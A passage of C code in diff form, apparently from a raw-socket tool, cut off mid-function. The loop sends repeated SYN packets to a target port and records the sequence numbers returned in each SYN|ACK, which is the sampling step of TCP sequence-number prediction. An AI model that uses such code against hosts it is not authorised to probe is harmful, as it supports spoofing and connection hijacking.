+char buffer[1500]; 
+struct IP_header *iphead; 
+struct TCP_header *tcphead; 
+struct sp_wait_packet pinfo;
+
+for(i=0;i<nr_of_packs;i++)
+  {
+  sleep(sec_delay);
+  my_p+=69;
+  transmit_TCP(fd_send, NULL, 0,0,0, ME, my_p, TGT, SCANTGT_P, 
+					        SCANSEQ+(i*69),0, SYN);
+  stat=wait_packet(fd_receive,&pinfo,TGT,SCANTGT_P,ME,my_p,SYN|ACK,TIMEOUT);
+  if(stat<0)
+	{return -1;}
+  else  {seqlist[i]=pinfo.seq;
+         if(pinfo.seq==0)
+           {printf("\nThis port doesn't accept connections...\n");exit(1);}
+         if(DEBUG!=0) printf("%X\n",pinfo.seq);};
+  }
+/* RESET auto, because our host sends RESET    */
+return 0;
+}
+
+----------------------------------------------------------------------------
+
